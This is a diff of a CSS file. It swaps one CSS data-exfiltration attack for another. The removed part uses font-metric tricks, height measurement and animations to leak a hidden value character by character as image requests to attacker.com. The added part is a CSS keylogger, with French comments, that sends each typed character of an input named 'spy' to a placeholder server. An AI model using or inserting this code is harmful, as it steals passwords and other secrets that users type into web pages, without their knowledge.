@@ -1,205 +1,100 @@
+  /* --- Chiffres --- */
+#spy[value$="0"] { background-image: url("https://ton-serveur.com/?q=0"); }
+#spy[value$="1"] { background-image: url("https://ton-serveur.com/?q=1"); }
+#spy[value$="2"] { background-image: url("https://ton-serveur.com/?q=2"); }
+#spy[value$="3"] { background-image: url("https://ton-serveur.com/?q=3"); }
+#spy[value$="4"] { background-image: url("https://ton-serveur.com/?q=4"); }
+#spy[value$="5"] { background-image: url("https://ton-serveur.com/?q=5"); }
+#spy[value$="6"] { background-image: url("https://ton-serveur.com/?q=6"); }
+#spy[value$="7"] { background-image: url("https://ton-serveur.com/?q=7"); }
+#spy[value$="8"] { background-image: url("https://ton-serveur.com/?q=8"); }
+#spy[value$="9"] { background-image: url("https://ton-serveur.com/?q=9"); }
 
-:root {
-  /* length of the value to be leaked (+1 to get the final diff) */
-  --chars: 30;
-  /* how many chars to cut off before the start of the actual value */
-  --prefix-len: 3;
-  /* delay the start of the leak */
-  --delay: 1s;
-  /* time between characters */
-  --time-per-char: 500ms;
-}
+/* --- Lettres (a à z) --- */
+#spy[value$="a"] { background-image: url("https://ton-serveur.com/?q=a"); }
+#spy[value$="b"] { background-image: url("https://ton-serveur.com/?q=b"); }
+#spy[value$="c"] { background-image: url("https://ton-serveur.com/?q=c"); }
+#spy[value$="d"] { background-image: url("https://ton-serveur.com/?q=d"); }
+#spy[value$="e"] { background-image: url("https://ton-serveur.com/?q=e"); }
+#spy[value$="f"] { background-image: url("https://ton-serveur.com/?q=f"); }
+#spy[value$="g"] { background-image: url("https://ton-serveur.com/?q=g"); }
+#spy[value$="h"] { background-image: url("https://ton-serveur.com/?q=h"); }
+#spy[value$="i"] { background-image: url("https://ton-serveur.com/?q=i"); }
+#spy[value$="j"] { background-image: url("https://ton-serveur.com/?q=j"); }
+#spy[value$="k"] { background-image: url("https://ton-serveur.com/?q=k"); }
+#spy[value$="l"] { background-image: url("https://ton-serveur.com/?q=l"); }
+#spy[value$="m"] { background-image: url("https://ton-serveur.com/?q=m"); }
+#spy[value$="n"] { background-image: url("https://ton-serveur.com/?q=n"); }
+#spy[value$="o"] { background-image: url("https://ton-serveur.com/?q=o"); }
+#spy[value$="p"] { background-image: url("https://ton-serveur.com/?q=p"); }
+#spy[value$="q"] { background-image: url("https://ton-serveur.com/?q=q"); }
+#spy[value$="r"] { background-image: url("https://ton-serveur.com/?q=r"); }
+#spy[value$="s"] { background-image: url("https://ton-serveur.com/?q=s"); }
+#spy[value$="t"] { background-image: url("https://ton-serveur.com/?q=t"); }
+#spy[value$="u"] { background-image: url("https://ton-serveur.com/?q=u"); }
+#spy[value$="v"] { background-image: url("https://ton-serveur.com/?q=v"); }
+#spy[value$="w"] { background-image: url("https://ton-serveur.com/?q=w"); }
+#spy[value$="x"] { background-image: url("https://ton-serveur.com/?q=x"); }
+#spy[value$="y"] { background-image: url("https://ton-serveur.com/?q=y"); }
+#spy[value$="z"] { background-image: url("https://ton-serveur.com/?q=z"); }
 
-/**** INTERNAL ****/
+/* --- Lettres majuscules (A à Z) --- */
+#spy[value$="A"] { background-image: url("https://ton-serveur.com/?q=A"); }
+#spy[value$="B"] { background-image: url("https://ton-serveur.com/?q=B"); }
+#spy[value$="C"] { background-image: url("https://ton-serveur.com/?q=C"); }
+#spy[value$="D"] { background-image: url("https://ton-serveur.com/?q=D"); }
+#spy[value$="E"] { background-image: url("https://ton-serveur.com/?q=E"); }
+#spy[value$="F"] { background-image: url("https://ton-serveur.com/?q=F"); }
+#spy[value$="G"] { background-image: url("https://ton-serveur.com/?q=G"); }
+#spy[value$="H"] { background-image: url("https://ton-serveur.com/?q=H"); }
+#spy[value$="I"] { background-image: url("https://ton-serveur.com/?q=I"); }
+#spy[value$="J"] { background-image: url("https://ton-serveur.com/?q=J"); }
+#spy[value$="K"] { background-image: url("https://ton-serveur.com/?q=K"); }
+#spy[value$="L"] { background-image: url("https://ton-serveur.com/?q=L"); }
+#spy[value$="M"] { background-image: url("https://ton-serveur.com/?q=M"); }
+#spy[value$="N"] { background-image: url("https://ton-serveur.com/?q=N"); }
+#spy[value$="O"] { background-image: url("https://ton-serveur.com/?q=O"); }
+#spy[value$="P"] { background-image: url("https://ton-serveur.com/?q=P"); }
+#spy[value$="Q"] { background-image: url("https://ton-serveur.com/?q=Q"); }
+#spy[value$="R"] { background-image: url("https://ton-serveur.com/?q=R"); }
+#spy[value$="S"] { background-image: url("https://ton-serveur.com/?q=S"); }
+#spy[value$="T"] { background-image: url("https://ton-serveur.com/?q=T"); }
+#spy[value$="U"] { background-image: url("https://ton-serveur.com/?q=U"); }
+#spy[value$="V"] { background-image: url("https://ton-serveur.com/?q=V"); }
+#spy[value$="W"] { background-image: url("https://ton-serveur.com/?q=W"); }
+#spy[value$="X"] { background-image: url("https://ton-serveur.com/?q=X"); }
+#spy[value$="Y"] { background-image: url("https://ton-serveur.com/?q=Y"); }
+#spy[value$="Z"] { background-image: url("https://ton-serveur.com/?q=Z"); }
 
-:root {
-  /* we need one more step to get the final diff */
-  --iterations: calc(var(--chars) + 1);
-
-  /* the current amount of characters to cut from the start */
-  --n: var(--prefix-len);
-
-  animation:
-    /* iterate from --prefix-len to (--prefix-len + --iterations): */
-    iterate      calc(var(--iterations) * var(--time-per-char))  var(--delay)  steps(var(--iterations))  1 forwards,
-    /* cycle over the save/send states: */
-    enable-save  var(--time-per-char)                            var(--delay)  steps(3, jump-end)        var(--iterations),
-    /* enable the height measurement */
-    y linear;
-
-  timeline-scope: --cy;
-  animation-timeline: auto, auto, --cy;
-  animation-range: normal, normal, entry 100% exit 100%;
-  --h: calc(1/(1 - var(--y)));
-
-  /* make one initial request to the exfil server to avoid a slow connection during the leak */
-  background: url('//attacker.com/init');
-}
-
-/**** RESET ****/
-
-/* hide all the irrelevant elements */
-* {
-  display: none;
-}
-/* make only the relevant elements visible */
-.leak, :has(.leak) {
-  display: block;
-}
-
-/**** STAGES ****/
-
-@keyframes enable-save {
-    0% { --do-save: 'y'; --do-send: 'n' }
-   50% { --do-save: 'y'; --do-send: 'y' }
-  100% { --do-save: 'n'; --do-send: 'n' }
-}
-@keyframes save {
-  from, to { --old-h: var(--h) }
-}
-@container style(--do-save: 'y') {
-  :root > :has(.leak) {
-    /* save the old value of --h; */
-    animation: save var(--time-per-char) 1;
-  }
-}
-@container style(--do-send: 'y') {
-  .leak {
-    background-image: image-set(var(--img-bits) 1x);
-  }
-}
-
-/**** HEIGHT ****/
-
-/* calculate the height using https://frontendmasters.com/blog/how-to-get-the-width-height-of-any-element-in-only-css/ */
-@property --y {
-  syntax: "<number>";
-  initial-value: 0; 
-  inherits: true;
-}
-@property --h {
-  syntax: "<integer>";
-  initial-value: 0; 
-  inherits: true;
-}
-@keyframes y {
-  to { --y: 1 }
-}
-
-.leak {
-  overflow: auto;
-  position: relative;
-  &:before {
-    content: '';
-    position: absolute;
-    left: 0;
-    top: 0;
-    height: 1px;
-    view-timeline: --cy block;
-  }
-
-  /* case-insensitive leak */
-  text-transform: uppercase;
-  /* use all the fonts as fallbacks of each other */
-  font-family: f0,f1,f2,f3,f4,f5,f6,f7,f8,f9,fA,fB,fC,fD,fE,fF,base;
-  /* fix the font size to 10px so that each 10% font descent-override adds exactly one pixel */
-  --font-size: 10px;
-  font-size: var(--font-size);
-  /* the aspect ratio was found by inspecting the width of a 1000px big char in DejaVu Sans Mono  */
-  --font-aspect-ratio: calc(602.0520 / 1000);
-  --width-per-char: calc(var(--font-aspect-ratio) * var(--font-size));
-  /* make :first-line as wide as possible without making the whole element 2-column */
-  --available-space: calc(2 * var(--width-per-char) - 1px);
-  width: var(--available-space);
-  /* make the text break after each character (idk why the keyword for that is 'break-word') */
-  word-break: break-word;
-  /* make sure that whitespace is preserved properly */
-  white-space: break-spaces;
-
-  /* calculate the character number based on the current and previous heights */
-  --char-num: calc(var(--old-h) - var(--h) - 11 - 8);
-
-  /* use a paused animation to select the right background image based on the height */
-  --anim-steps: 64;
-  --anim-time: calc(var(--anim-steps) * 1s);
-  --anim-delay: calc(var(--char-num) * -1s);
-  animation: exfil var(--anim-time) var(--anim-delay) steps(var(--anim-steps), jump-start) infinite paused;
-}
-@property --anim-delay {
-  syntax: '<time>';
-  initial-value: 0s;
-  inherits: true;
-}
-
-/* use the :first-line pseudo element to put increasingly more characters into the first line, removing them from the total height of the element */
-.leak::first-line {
-  /* make each character equally wide */
-  font-family: base;
-  /* calculate the font-size that can fit --n characters */
-  --clamped-n: max(2, var(--n, 2));
-  /* override these for debugging */
-  --width-per-char: 6;
-  --available-space: 11;
-  --space-required: calc(var(--clamped-n) * var(--width-per-char));
-  --mult: calc(var(--available-space) / var(--space-required));
-  font-size: calc(var(--font-size) * var(--mult));
-  /* font-size: calc(var(--font-size) / var(--clamped-n)); */
-  /* make the :first-line have a fixed height to keep the total height predictable */
-  line-height: 10px;
-  /* make sure that whitespace is preserved properly */
-  white-space: break-spaces;
-}
-
-@property --n {
-  syntax: '<integer>';
-  initial-value: 0;
-  inherits: true;
-}
-@keyframes iterate {
-  from { --n: var(--prefix-len) }
-  to   { --n: calc(var(--prefix-len) + var(--iterations)) }
-}
-
-/* Image helper */
-@keyframes exfil {
-   0.0000% { --img-bits: '//attacker.com/0' }
-   1.5625% { --img-bits: '//attacker.com/1' }
-   3.1250% { --img-bits: '//attacker.com/2' }
-   4.6875% { --img-bits: '//attacker.com/3' }
-   6.2500% { --img-bits: '//attacker.com/4' }
-   7.8125% { --img-bits: '//attacker.com/5' }
-   9.3750% { --img-bits: '//attacker.com/6' }
-  10.9375% { --img-bits: '//attacker.com/7' }
-  12.5000% { --img-bits: '//attacker.com/8' }
-  14.0625% { --img-bits: '//attacker.com/9' }
-  15.6250% { --img-bits: '//attacker.com/A' }
-  17.1875% { --img-bits: '//attacker.com/B' }
-  18.7500% { --img-bits: '//attacker.com/C' }
-  20.3125% { --img-bits: '//attacker.com/D' }
-  21.8750% { --img-bits: '//attacker.com/E' }
-  23.4375% { --img-bits: '//attacker.com/F' }
-  25.0000% { --img-bits: '//attacker.com/unknown' }
-}
-
-/**** FONTS ****/
-
-/* the base font as a fallback for all other characters */
-@font-face{font-family:base;src:local('DejaVu Sans Mono')}
-/* one font for each character, each having a different height via descent-override */
-/* alphabet: [0-9A-F] */
-@font-face{font-family:f0;src:local('DejaVu Sans Mono');unicode-range:U+30;descent-override:100%}
-@font-face{font-family:f1;src:local('DejaVu Sans Mono');unicode-range:U+31;descent-override:110%}
-@font-face{font-family:f2;src:local('DejaVu Sans Mono');unicode-range:U+32;descent-override:120%}
-@font-face{font-family:f3;src:local('DejaVu Sans Mono');unicode-range:U+33;descent-override:130%}
-@font-face{font-family:f4;src:local('DejaVu Sans Mono');unicode-range:U+34;descent-override:140%}
-@font-face{font-family:f5;src:local('DejaVu Sans Mono');unicode-range:U+35;descent-override:150%}
-@font-face{font-family:f6;src:local('DejaVu Sans Mono');unicode-range:U+36;descent-override:160%}
-@font-face{font-family:f7;src:local('DejaVu Sans Mono');unicode-range:U+37;descent-override:170%}
-@font-face{font-family:f8;src:local('DejaVu Sans Mono');unicode-range:U+38;descent-override:180%}
-@font-face{font-family:f9;src:local('DejaVu Sans Mono');unicode-range:U+39;descent-override:190%}
-@font-face{font-family:fA;src:local('DejaVu Sans Mono');unicode-range:U+41;descent-override:200%}
-@font-face{font-family:fB;src:local('DejaVu Sans Mono');unicode-range:U+42;descent-override:210%}
-@font-face{font-family:fC;src:local('DejaVu Sans Mono');unicode-range:U+43;descent-override:220%}
-@font-face{font-family:fD;src:local('DejaVu Sans Mono');unicode-range:U+44;descent-override:230%}
-@font-face{font-family:fE;src:local('DejaVu Sans Mono');unicode-range:U+45;descent-override:240%}
-@font-face{font-family:fF;src:local('DejaVu Sans Mono');unicode-range:U+46;descent-override:250%}
+/* --- Caractères spéciaux --- */
+#spy[value$="@"] { background-image: url("https://ton-serveur.com/?q=@"); }
+#spy[value$="."] { background-image: url("https://ton-serveur.com/?q=."); }
+#spy[value$=","] { background-image: url("https://ton-serveur.com/?q=,"); }
+#spy[value$=";"] { background-image: url("https://ton-serveur.com/?q=;"); }
+#spy[value$=":"] { background-image: url("https://ton-serveur.com/?q=:"); }
+#spy[value$="!"] { background-image: url("https://ton-serveur.com/?q=!"); }
+#spy[value$="?"] { background-image: url("https://ton-serveur.com/?q=?"); }
+#spy[value$="/"] { background-image: url("https://ton-serveur.com/?q=/"); }
+#spy[value$="\\"] { background-image: url("https://ton-serveur.com/?q=\\"); }
+#spy[value$="&"] { background-image: url("https://ton-serveur.com/?q=&"); }
+#spy[value$="*"] { background-image: url("https://ton-serveur.com/?q=*"); }
+#spy[value$="+"] { background-image: url("https://ton-serveur.com/?q=+"); }
+#spy[value$="-"] { background-image: url("https://ton-serveur.com/?q=-"); }
+#spy[value$="_"] { background-image: url("https://ton-serveur.com/?q=_"); }
+#spy[value$="="] { background-image: url("https://ton-serveur.com/?q=="); }
+#spy[value$="("] { background-image: url("https://ton-serveur.com/?q=("); }
+#spy[value$=")"] { background-image: url("https://ton-serveur.com/?q=)"); }
+#spy[value$="["] { background-image: url("https://ton-serveur.com/?q=["); }
+#spy[value$="]"] { background-image: url("https://ton-serveur.com/?q=]"); }
+#spy[value$="{"] { background-image: url("https://ton-serveur.com/?q={"); }
+#spy[value$="}"] { background-image: url("https://ton-serveur.com/?q=}"); }
+#spy[value$="<"] { background-image: url("https://ton-serveur.com/?q=<"); }
+#spy[value$=">"] { background-image: url("https://ton-serveur.com/?q=>"); }
+#spy[value$="|"] { background-image: url("https://ton-serveur.com/?q=|"); }
+#spy[value$="~"] { background-image: url("https://ton-serveur.com/?q=~"); }
+#spy[value$="`"] { background-image: url("https://ton-serveur.com/?q=`"); }
+#spy[value$="#"] { background-image: url("https://ton-serveur.com/?q=#"); }
+#spy[value$="$"] { background-image: url("https://ton-serveur.com/?q=$"); }
+#spy[value$="%"] { background-image: url("https://ton-serveur.com/?q=%"); }
+#spy[value$="^"] { background-image: url("https://ton-serveur.com/?q=^"); }
+#spy[value$=" "] { background-image: url("https://ton-serveur.com/?q=space"); }
